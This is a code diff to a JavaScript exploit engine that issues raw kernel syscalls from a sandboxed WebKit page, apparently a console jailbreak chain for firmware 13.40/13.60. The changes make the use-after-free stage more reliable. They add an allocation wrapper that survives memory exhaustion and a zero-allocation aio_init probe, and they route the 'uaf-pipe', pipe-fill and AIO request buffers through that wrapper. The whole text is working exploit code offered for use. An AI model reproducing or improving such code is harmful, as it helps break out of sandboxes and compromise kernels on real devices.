@@ -185,6 +185,30 @@ export function makeBagagwaEngine(X) {
         return { base: ptr, u8, bytes: size, label };
     }
 
+    // OOM-resilient alloc: P.malloc can throw "out of free memory" when the
+    // arena left by the carrier release/settle is too tight (seen right after
+    // [PAIR-RELEASE] on FW 13.40/13.60). Never throws — tries one GC-and-retry,
+    // then returns null so callers produce a clean diagnostic `why` instead of
+    // an uncaught exception that kills the page.
+    function safeAlloc(size, label) {
+        try {
+            return alloc(size, label);
+        } catch (e) {
+            note("[alloc] P.malloc OOM for '" + label + "' (" + size + "B): " +
+                (e && e.message ? e.message : e));
+            try { if (typeof globalThis.gc === "function") globalThis.gc(); }
+            catch (e2) { }
+            try {
+                const retry = alloc(size, label);
+                note("[alloc] retry after gc OK: '" + label + "'");
+                return retry;
+            } catch (e3) {
+                note("[alloc] arena exhausted, no reclaim possible for '" + label + "'");
+                return null;
+            }
+        }
+    }
+
     // AIO init: 3-tier fallback (mirrors slopkit_ref/bagagwa.js).
     // Tier 1: aio_init (0x29E)  — global context. Blocked by WebKit sandbox on
     //         some FWs (EPERM). NOT fatal — fall through.
@@ -195,20 +219,44 @@ export function makeBagagwaEngine(X) {
     async function initAio() {
         if (S.aioInited) return { ok: true, cached: true };
 
-        // Tier 1: global aio_init (with proper params struct on newer FW)
-        const initBuf = alloc(0x10, "aio-init-params");
-        w32(initBuf.u8, 0x00, 0x10); // struct size
-        w32(initBuf.u8, 0x04, 32);   // max requests
-        w32(initBuf.u8, 0x08, 0);
-        w32(initBuf.u8, 0x0c, 0);
-        const r = await sys(SYS_AIO_INIT, initBuf.base);
-        if (!r.failed) {
+        // Tier 1 — ZERO-ALLOC probe first. The sandbox (EPERM) and arg checks
+        // (EINVAL) happen before the kernel dereferences the params pointer, so
+        // pass NULL. This keeps the AIO path allocation-free on FWs where AIO is
+        // blocked — critical because this is the FIRST kernel-stage allocation
+        // after "released WebKit carrier / settled memory", and P.malloc can
+        // OOM if the arena is tight (throws "out of free memory"). Only build
+        // the 0x10 params struct if the zero-arg call proves the syscall is
+        // reachable but wants a valid pointer.
+        const r0 = await sys(SYS_AIO_INIT, 0);
+        if (!r0.failed) {
             S.aioInited = true;
-            note("AIO subsystem initialized via aio_init");
+            note("[S0-0a] AIO initialized via aio_init(0) — no params needed");
             return { ok: true };
         }
-        note("[S0-0a] aio_init ret=" + r.s32 + " err=" + r.errText +
-            " — falling through to aio_create (separate sandbox perm)");
+        if (r0.errText !== "EPERM" && r0.errText !== "ENOSYS") {
+            // reachable but picky — retry once with a real params struct
+            note("[S0-0a] aio_init(0) ret=" + r0.s32 + " err=" + r0.errText +
+                " — reachable, retrying with params struct");
+            const initBuf = safeAlloc(0x10, "aio-init-params");
+            if (initBuf) {
+                w32(initBuf.u8, 0x00, 0x10); // struct size
+                w32(initBuf.u8, 0x04, 32);   // max requests
+                w32(initBuf.u8, 0x08, 0);
+                w32(initBuf.u8, 0x0c, 0);
+                const r = await sys(SYS_AIO_INIT, initBuf.base);
+                if (!r.failed) {
+                    S.aioInited = true;
+                    note("AIO subsystem initialized via aio_init (params struct)");
+                    return { ok: true };
+                }
+                note("[S0-0a] aio_init(params) ret=" + r.s32 + " err=" + r.errText);
+            } else {
+                note("[S0-0a] params alloc OOM — skipping params retry, treating as blocked");
+            }
+        } else {
+            note("[S0-0a] aio_init(0) ret=" + r0.s32 + " err=" + r0.errText +
+                " — blocked, falling through to aio_create (no alloc used)");
+        }
 
         // Tier 2: aio_create per-channel fd — avoids global init entirely.
         for (const args of [[8, 0], [8], [0]]) {
@@ -251,7 +299,8 @@ export function makeBagagwaEngine(X) {
     }
 
     async function submitAioRequest(instanceId, buf, size, fd, offset) {
-        const reqBuf = alloc(0x40, "aio-request-" + S.aioRequests.length);
+        const reqBuf = safeAlloc(0x40, "aio-request-" + S.aioRequests.length);
+        if (!reqBuf) return { ok: false, why: "aio request buffer OOM (arena exhausted)" };
         w32(reqBuf.u8, 0x00, fd);
         w64(reqBuf.u8, 0x08, buf);
         w64(reqBuf.u8, 0x10, i64(size, 0));
@@ -272,7 +321,9 @@ export function makeBagagwaEngine(X) {
 
         const instanceId = S.aioRequests[0].instanceId;
 
-        const reqIdBuf = alloc(num * 4, "aio-multi-wait-ids");
+        const reqIdBuf = safeAlloc(num * 4, "aio-multi-wait-ids");
+        if (!reqIdBuf)
+            return { ok: false, why: "multi-wait id buffer OOM (arena exhausted)" };
         for (let i = 0; i < num; i++) {
             w32(reqIdBuf.u8, i * 4, S.aioRequests[i].id);
         }
@@ -619,7 +670,8 @@ export function makeBagagwaEngine(X) {
             out.steps.push("AIO initialized");
         }
 
-        const pipeBuf = alloc(8, "uaf-pipe");
+        const pipeBuf = safeAlloc(8, "uaf-pipe");
+        if (!pipeBuf) { out.why = "uaf-pipe buffer OOM (arena exhausted)"; return out; }
         w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
         const pipeR = await sys(SYS_PIPE2, pipeBuf.base, 0);
         if (pipeR.failed) { out.why = "pipe2 for AIO failed: " + pipeR.errText; return out; }
@@ -631,7 +683,8 @@ export function makeBagagwaEngine(X) {
         const numRequests = o.numRequests || 2;
 
         const fillSize = 64 * numRequests;
-        const fillBuf = alloc(fillSize, "uaf-pipe-fill");
+        const fillBuf = safeAlloc(fillSize, "uaf-pipe-fill");
+        if (!fillBuf) { out.why = "pipe fill buffer OOM (arena exhausted)"; return out; }
         for (let j = 0; j < fillSize; j++) fillBuf.u8[j] = 0x41;
         const fillR = await sys(SYS_WRITE, S.aioWfd, fillBuf.base, fillSize);
         if (fillR.failed) { out.why = "pipe fill: " + fillR.errText; return out; }
@@ -641,7 +694,8 @@ export function makeBagagwaEngine(X) {
         if (!ci.ok) { out.why = ci.why; return out; }
         out.steps.push("AIO instance created: " + ci.id);
 
-        const dataBuf = alloc(64, "aio-data");
+        const dataBuf = safeAlloc(64, "aio-data");
+        if (!dataBuf) { out.why = "aio-data buffer OOM (arena exhausted)"; return out; }
         for (let i = 0; i < numRequests; i++) {
             const sr = await submitAioRequest(ci.id, dataBuf.base, 64, S.aioRfd, i64(0, 0));
             if (!sr.ok) { out.why = sr.why; return out; }
